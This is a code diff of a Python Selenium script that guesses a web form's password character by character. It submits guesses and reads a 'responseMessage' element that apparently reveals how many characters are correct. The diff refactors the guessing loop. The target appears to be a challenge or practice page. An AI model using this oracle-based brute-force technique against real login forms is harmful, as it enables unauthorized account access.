@@ -1,5 +1,4 @@
 # https://stackoverflow.com/questions/13166395/fill-input-of-type-text-and-press-submit-using-python
-import driver
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 import time
@@ -35,34 +34,31 @@ def fill_password(input_string):
 
 
 def print_characters(right_guessed):
-
     all_characters = "aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ"
     length = 2
-    response_message_element = driver.find_element(By.ID, "responseMessage")
-    passwordguessed = ""
-    passwordguess = ""
+    password_guessed = ""
+    password_guess = ""
     # Get the text content of the element
-    response_message_text = response_message_element.text
+
     while True:
         for character in all_characters:
-
-            response_message_element = driver.find_element(By.ID, "responseMessage")
-
-            if int(extract_numbers(response_message_text)) == length:
-                length = length + 1
-                passwordguessed += passwordguess
-                print(passwordguessed)
-
-            # Get the text content of the element
-            response_message_text = response_message_element.text
-            passwordguess = passwordguessed + character
+            password_guess = password_guessed + character
+            print(fill_password(password_guess))
 
             driver.find_element(By.NAME, "password").clear()
-
-            print(fill_password(passwordguess))
-            driver.find_element(By.NAME, "password").send_keys(fill_password(passwordguess))
+            driver.find_element(By.NAME, "password").send_keys(fill_password(password_guess))
             driver.find_element(By.CLASS_NAME, "btn-primary").click()
-            time.sleep(0.3)
+            time.sleep(0.1)
+
+            response_message_element = driver.find_element(By.ID, "responseMessage")
+            # Get the text content of the element
+            response_message_text = response_message_element.text
+
+            if int(extract_numbers(response_message_text)) == length:
+                length += 1
+                password_guessed += character
+                print(password_guessed)
+                break
 
 
 
